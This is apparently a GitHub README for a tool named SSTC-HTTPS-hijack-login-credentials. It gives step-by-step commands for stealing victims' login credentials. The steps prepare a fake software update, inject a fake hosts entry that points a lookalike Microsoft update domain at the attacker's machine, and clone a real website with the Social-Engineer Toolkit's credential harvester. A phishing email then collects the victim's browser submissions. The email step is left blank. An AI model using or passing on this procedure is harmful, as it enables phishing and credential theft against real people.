# WARNING: This is a development project and is not READY for USING ;)
- BR
------------------------------------------------------------------------------------------
# SSTC-HTTPS-hijack-login-credentials 
- by nu11secur1ty

![](https://github.com/nu11secur1ty/SSTC-HTTPS-hijack-login-credentials/blob/master/logo/https_image-620x499.jpg)


- Installing requirements
     https://github.com/trustedsec/social-engineer-toolkit

- Preparing packages
For other Linux distro attackers
```
$ git clone https://github.com/trustedsec/social-engineer-toolkit/ set/
$ cd set
$ pip install -r requirements.txt
```
------------------------------------------------------------

# Exploit steps:

1. - Preparing for fake update for the victim:
```bash
git clone https://github.com/nu11secur1ty/SSTC-HTTPS-hijack-login-credentials.git
cd SSTC-HTTPS-hijack-login-credentials/Attacker/sh1mazu_https_fake
bash sh1m@zu.sh
[1]
     enter
```

2. - Preparing your hosts-file for exploiting of the victim:
     
     // fakesite.login.com

```bash
cd SSTC-HTTPS-hijack-login-credentials/Attacker/hosts_fake_inject
bash fakehost.sh
     # NOTE: You should set up your Network setup to STATIC!
     # For example:
     # with IP 10.10.10.100 or 192.168.1.100
     # Or it'd depend from the local network in leyar2
     
     type the attacker IP 10.10.10.100 # or 192.168.1.100
     
     type the fake domain microsoft.update.com
     
     enter
```

3. - Exploit the victim and then ***Stop Apache2***
```bash
systemct stop apache2.service
```
-------------------------------------------------------------

***SECOND PART***

1. - setoolkit cloning of real website
```bash
setoolkit
1) Social-Engineering Attacks
     set>1
     enter
2) Website Attack Vectors
     set>2
     enter
3) Credential Harvester Attack Method
     set:webattack>3
     enter
2) Site Cloner
     set:webattack>2
     enter
set:webattack> IP address for the POST back in Harvester/Tabnabbing [10.10.10.100]:_your_local_layer2_IP_
     enter
[-] Example: http://www.thisisafakesite.com
set:webattack> Enter the url to clone: _your_site_
     enter
     enter
```
2. - Sending a hijack email of the victim.
```bash

```

3. - Receiving the hits from browser of the victim





